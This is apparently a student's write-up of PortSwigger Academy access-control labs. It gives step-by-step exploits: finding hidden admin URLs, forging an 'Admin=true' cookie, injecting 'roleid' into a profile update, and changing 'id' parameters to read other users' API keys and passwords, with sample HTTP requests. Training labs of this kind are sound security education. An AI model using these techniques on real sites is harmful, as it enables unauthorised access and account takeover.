# Access control vulnerabilities
- Author: [Mateusz Głuchowski](https://github.com/hue1337)
- Site: [PortSwigger Academy](https://portswigger.net/web-security/)

## Lab: Unprotected admin functionality
1. Find `robots.txt`
    ```
    User-agent: *
    Disallow: /administrator-panel
    ```
2. Access administrator panel and remove carlos.

## Lab: Unprotected admin functionality with unpredictable URLAPPRENTICE
1. Inspect the source of the website
    ```js
    if (isAdmin) {
    var topLinksTag = document.getElementsByClassName("top-links")[0];
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('href', '/admin-5157fg');
    adminPanelTag.innerText = 'Admin panel';
    topLinksTag.append(adminPanelTag);
    var pTag = document.createElement('p');
    pTag.innerText = '|';
    topLinksTag.appendChild(pTag);
    }
    ```
2. Access administrator panel and remove carlos.

## Lab: User role controlled by request parameter
1. Log in with `wiener:peter` credentials.
2. After looking into cookies we can see that `Admin` value is set to false. After changing it we are now able to access admin panel.
    ```
    GET /admin HTTP/2
    Host: 0a5a009403dbd0a9804949a9004700bc.web-security-academy.net
    Cookie: Admin=true; session=Jv3utCd0N3EbkNaneBKcWc2ffZXCz8YU
    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
    ```
3. During traffic interception and constantly changing `Admin` value to true we can finally send the carlos account delete request:
    ```
    GET /admin/delete?username=carlos HTTP/2
    Host: 0a5a009403dbd0a9804949a9004700bc.web-security-academy.net
    Cookie: Admin=true; session=Jv3utCd0N3EbkNaneBKcWc2ffZXCz8YU
    ```

## Lab: User role can be modified in user profile
1. After inspecting different elements it appeared that we can add `roleid` to the json body during email submission. 
    ```json
    {
        "email":"wiener@normaln-user.net",
        "roleid":2
    }
    ```

2. After submitting new email out account's roleid has changed and we can delete carlos account.

## Lab: User ID controlled by request parameter
1. Log into the acc `wiener:peter`
2. Change the `id` in the url:
    ```
    https://0a3e003904eb84ac81aa3929008e006b.web-security-academy.net/my-account?id=carlos
    ```
3. Obtain `carlos` API key.

## Lab: User ID controlled by request parameter, with unpredictable user IDs
1. Log into the acc `wiener:peter`
2. To enumerate `carlos` API key we need his `userid`
3. Looking around the website we find his profile. (Thanks to the post he posted).
    ```
    ef89e7e5-2368-4916-a926-95e5647b2a97
    ```
4. Next step is to copy his userid from the url and paste int o `my-account` url:
    ```
    https://0a31005303a5159887baad2c0098005c.web-security-academy.net/my-account?id=ef89e7e5-2368-4916-a926-95e5647b2a97
    ```

5. Submit the answer.

## Lab: User ID controlled by request parameter with data leakage in redirect
1. Log in using `wiener:peter` credentials.
2. Change the username in body request to `carlos`.
3. Inspect the response and enjoy the anwer.
    ```html
    HTTP/2 302 Found
    Location: /login
    Content-Type: text/html; charset=utf-8
    Cache-Control: no-cache
    X-Frame-Options: SAMEORIGIN
    Content-Length: 3655
    ...
                        <h1>My Account</h1>
                        <div id=account-content>
                            <p>Your username is: carlos</p>
                            <div>Your API Key is: imKOFZdBKUxFJCdzMkEVJFErefVrLZr8</div><br/>
    ...
    </html>

    ```
## Lab: User ID controlled by request parameter with password disclosure
1. Change `id` to administrator:
    ```
    https://0a7d0023036efed682cd748c00a00004.web-security-academy.net/my-account?id=administrator
    ```

2. Check `value` in the password field.
3. Log in as the `administrator`.
Delete carlos's account

## Lab: Insecure direct object references
